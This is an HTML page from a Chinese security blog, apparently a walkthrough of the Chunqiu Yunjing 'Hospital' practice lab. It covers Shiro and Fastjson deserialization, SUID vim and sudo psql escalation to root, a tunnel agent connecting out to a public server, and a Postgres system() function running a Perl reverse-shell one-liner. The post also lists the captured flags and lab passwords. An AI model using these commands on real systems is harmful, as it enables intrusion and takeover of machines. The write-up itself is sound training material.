@@ -1,0 +1,855 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sp4rks3">
+  <meta name="keywords" content="博客">
+  
+    <meta name="description" content="前言在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。    网段 IP地址 说明    互联网侧 39.99.227.180 heapdump文件泄露+shiro反序列化   172.30.12.0&#x2F;24 172.30.12.5 入口机   172.30">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜-Initial">
+<meta property="og:url" content="https://sp4rks3.github.io/2025/05/19/%E5%A4%A7%E5%B8%88%E4%B9%8B%E8%B7%AF/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital/index.html">
+<meta property="og:site_name" content="Sp4rks3&#39;s Blog">
+<meta property="og:description" content="前言在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。    网段 IP地址 说明    互联网侧 39.99.227.180 heapdump文件泄露+shiro反序列化   172.30.12.0&#x2F;24 172.30.12.5 入口机   172.30">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/05/image-20250520131428386.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519172226581.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519152140753.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519172440279.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519172659360.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519172912603.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519173110318.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519173314082.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519173520789.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519173846942.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519174101449.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519155927950.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519160134984.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519160407659.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519155904826.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519161615536.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519191622521.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519162521190.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519162503819.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519163112103.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519180105696.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519180256298.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519180630775.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519180859852.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519181025033.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519181100412.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519181430467.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519181748570.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519183236907.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519183259067.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519183425606.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519185951105.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519185938421.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519190059566.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519190623217.png">
+<meta property="article:published_time" content="2025-05-19T09:18:30.140Z">
+<meta property="article:modified_time" content="2025-05-20T13:32:49.268Z">
+<meta property="article:author" content="Sp4rks3">
+<meta property="article:tag" content="春秋云镜">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://image.sp4rks.xyz/2025/05/image-20250520131428386.png">
+  
+  
+  
+  <title>春秋云镜-Initial - Sp4rks3&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sp4rks3.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"woyaola":null,"cnzz":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sp4rks3&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="春秋云镜-Initial"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-19 17:18" pubdate>
+          2025年5月19日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          667 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          6 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">春秋云镜-Initial</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。</p>
+<table>
+<thead>
+<tr>
+<th align="left">网段</th>
+<th align="left">IP地址</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">互联网侧</td>
+<td align="left">39.99.227.180</td>
+<td align="left">heapdump文件泄露+shiro反序列化</td>
+</tr>
+<tr>
+<td align="left">172.30.12.0&#x2F;24</td>
+<td align="left">172.30.12.5</td>
+<td align="left">入口机</td>
+</tr>
+<tr>
+<td align="left">172.30.12.0&#x2F;24</td>
+<td align="left">172.30.12.6</td>
+<td align="left">Nacos yaml反序列化</td>
+</tr>
+<tr>
+<td align="left">双网卡主机</td>
+<td align="left">172.30.12.236</td>
+<td align="left">Fastjson反序列化</td>
+</tr>
+<tr>
+<td align="left">172.30.54.0&#x2F;24</td>
+<td align="left">172.30.54.179</td>
+<td align="left">Grafana任意文件读取</td>
+</tr>
+</tbody></table>
+<p><img src="https://image.sp4rks.xyz/2025/05/image-20250520131428386.png" srcset="/img/loading.gif" lazyload alt="image-20250520131428386"></p>
+<p>稍微对这个图解释一下方便理解：1. 先获取互联网可达的目标主机(39.99.227.180)的shell；2. 在公网服务器(39.107.82.184)和主机1之间建立Stowaway隧道；3. 通过主机1的6666端口代理访问DMZ区域的其他主机；4. 主机3通过隧道连接回主机1，建立第二级代理节点；5.通过主机3的代理(7777端口)访问内网区域的主机；6. 最终实现从攻击者主机到内网资源的双重代理访问。</p>
+<h1 id="39-99-227-180"><a href="#39-99-227-180" class="headerlink" title="39.99.227.180"></a>39.99.227.180</h1><p>一眼shiro</p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519172226581.png" srcset="/img/loading.gif" lazyload alt="image-20250519172226581"></p>
+<p>尝试用工具破解链子不行，然后想起fscan中有heapdump</p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519152140753.png" srcset="/img/loading.gif" lazyload alt="image-20250519152140753"></p>
+<p>直接打个内存马连接上就行</p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519172440279.png" srcset="/img/loading.gif" lazyload alt="image-20250519172440279"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519172659360.png" srcset="/img/loading.gif" lazyload alt="image-20250519172659360"></p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -perm <span class="hljs-number">-4000</span> -type f <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519172912603.png" srcset="/img/loading.gif" lazyload alt="image-20250519172912603"></p>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">/usr/bin/vim.<span class="hljs-keyword">basic</span>  -c &#x27;:python3 import <span class="hljs-keyword">os</span>; <span class="hljs-keyword">os</span>.execl(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-pc&quot;</span>, <span class="hljs-string">&quot;reset; exec bash -p&quot;</span>)&#x27; &amp;<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fg</span> %<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519173110318.png" srcset="/img/loading.gif" lazyload alt="image-20250519173110318"></p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag01: flag&#123;8016408b-8efd-<span class="hljs-number">48b7</span>-b6e5-dc1b50dcdfa4&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ctrl</span> +d 回到pwncat<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519173314082.png" srcset="/img/loading.gif" lazyload alt="image-20250519173314082"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519173520789.png" srcset="/img/loading.gif" lazyload alt="image-20250519173520789"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux_x64_admin -l 1234 -s 123<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">./linux_x64_agent <span class="hljs-punctuation">-</span>c <span class="hljs-number">39.107</span>.<span class="hljs-number">82.184</span><span class="hljs-punctuation">:</span><span class="hljs-number">1234</span> <span class="hljs-punctuation">-</span>s <span class="hljs-number">123</span> <span class="hljs-meta">&amp;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519173846942.png" srcset="/img/loading.gif" lazyload alt="image-20250519173846942"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519174101449.png" srcset="/img/loading.gif" lazyload alt="image-20250519174101449"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519155927950.png" srcset="/img/loading.gif" lazyload alt="image-20250519155927950"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519160134984.png" srcset="/img/loading.gif" lazyload alt="image-20250519160134984"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519160407659.png" srcset="/img/loading.gif" lazyload alt="image-20250519160407659"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519155904826.png" srcset="/img/loading.gif" lazyload alt="image-20250519155904826"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519161615536.png" srcset="/img/loading.gif" lazyload alt="image-20250519161615536"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519191622521.png" srcset="/img/loading.gif" lazyload alt="image-20250519191622521"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag02</span>: flag&#123;ee5dac3e-<span class="hljs-number">4</span>eac-<span class="hljs-number">4</span>d9a-<span class="hljs-number">8</span>bff-d3f712b6b959&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519162521190.png" srcset="/img/loading.gif" lazyload alt="image-20250519162521190"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519162503819.png" srcset="/img/loading.gif" lazyload alt="image-20250519162503819"></p>
+<p>可以用通杀的payload打，打了半天没成功，想起是不出网的，可以把JNDI攻击放在01，我这里太麻烦了，就直接用插件了</p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519163112103.png" srcset="/img/loading.gif" lazyload alt="image-20250519163112103"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519180105696.png" srcset="/img/loading.gif" lazyload alt="image-20250519180105696"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag03</span>: flag&#123;a87370ce-cd37-<span class="hljs-number">4</span>f5b-bc30-<span class="hljs-number">1</span>b9e805582c1&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519180256298.png" srcset="/img/loading.gif" lazyload alt="image-20250519180256298"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519180630775.png" srcset="/img/loading.gif" lazyload alt="image-20250519180630775"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519180859852.png" srcset="/img/loading.gif" lazyload alt="image-20250519180859852"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519181025033.png" srcset="/img/loading.gif" lazyload alt="image-20250519181025033"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519181100412.png" srcset="/img/loading.gif" lazyload alt="image-20250519181100412"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519181430467.png" srcset="/img/loading.gif" lazyload alt="image-20250519181430467"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519181748570.png" srcset="/img/loading.gif" lazyload alt="image-20250519181748570"></p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">postgres:</span>Postgres<span class="hljs-subst">@123</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519183236907.png" srcset="/img/loading.gif" lazyload alt="image-20250519183236907"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519183259067.png" srcset="/img/loading.gif" lazyload alt="image-20250519183259067"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR REPLACE</span> <span class="hljs-keyword">FUNCTION</span> <span class="hljs-keyword">system</span> (<span class="hljs-type">cstring</span>) <span class="hljs-keyword">RETURNS</span> <span class="hljs-type">integer</span> <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span> <span class="hljs-keyword">LANGUAGE</span> <span class="hljs-string">&#x27;c&#x27;</span> <span class="hljs-keyword">STRICT</span>;<br></code></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519183425606.png" srcset="/img/loading.gif" lazyload alt="image-20250519183425606"></p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">select system(&#x27;perl -e \&#x27;use Socket;<span class="hljs-variable">$i</span>=<span class="hljs-string">&quot;172.30.54.179&quot;</span>;<span class="hljs-variable">$p</span>=<span class="hljs-number">1234</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;\&#x27;&#x27;);<br></code></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519185951105.png" srcset="/img/loading.gif" lazyload alt="image-20250519185951105"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519185938421.png" srcset="/img/loading.gif" lazyload alt="image-20250519185938421"></p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python3 -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519190059566.png" srcset="/img/loading.gif" lazyload alt="image-20250519190059566"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ruby">postgres<span class="hljs-variable">@web04</span><span class="hljs-symbol">:/usr/local/pgsql/data</span><span class="hljs-variable">$ </span>sudo /usr/local/postgresql/bin/psql<br>sudo /usr/local/postgresql/bin/psql<br><span class="hljs-title class_">Password</span>: <span class="hljs-number">123456</span><br><br><span class="hljs-title class_">Welcome</span> to psql <span class="hljs-number">8.1</span>.<span class="hljs-number">0</span>, the <span class="hljs-title class_">Postgre</span>SQL interactive terminal.<br><br><span class="hljs-title class_">Type</span>:  \copyright <span class="hljs-keyword">for</span> distribution terms<br>       \h <span class="hljs-keyword">for</span> help with <span class="hljs-variable constant_">SQL</span> commands<br>       \? <span class="hljs-keyword">for</span> help with psql commands<br>       \g <span class="hljs-keyword">or</span> terminate with semicolon to execute query<br>       \q to quit<br><br>root=<span class="hljs-comment"># \?</span><br><span class="hljs-title class_">Input</span>/<span class="hljs-title class_">Output</span><br>--<span class="hljs-title class_">More</span>--!<span class="hljs-regexp">/bin/bash</span><br>root<span class="hljs-variable">@web04</span><span class="hljs-symbol">:/usr/local/pgsql/data</span><span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519190623217.png" srcset="/img/loading.gif" lazyload alt="image-20250519190623217"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag04</span>: flag&#123;a90adb0f-<span class="hljs-number">7</span>d19-<span class="hljs-number">4</span>f9f-be3d-<span class="hljs-number">0</span>a8207ec0dc0&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p><a target="_blank" rel="noopener" href="https://5ime.cn/yunjing-hospital.html">https://5ime.cn/yunjing-hospital.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://5ime.cn/msa-intranet-penetration.html#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-1">https://5ime.cn/msa-intranet-penetration.html#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-1</a></p>
+<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/09/21/%e5%86%85%e7%bd%91%e4%bb%a3%e7%90%86%e6%90%ad%e5%bb%ba/">https://fushuling.com/index.php/2023/09/21/%e5%86%85%e7%bd%91%e4%bb%a3%e7%90%86%e6%90%ad%e5%bb%ba/</a></p>
+<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2024/01/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hospital/">https://fushuling.com/index.php/2024/01/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hospital/</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Fo2bWRnLj9F_IgFNnt3nRA">https://mp.weixin.qq.com/s/Fo2bWRnLj9F_IgFNnt3nRA</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="category-chain-item">内网安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" class="print-no-link">#春秋云镜</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>春秋云镜-Initial</div>
+      <div>https://sp4rks3.github.io/2025/05/19/大师之路/春秋云镜-Hospital/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Sp4rks3</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
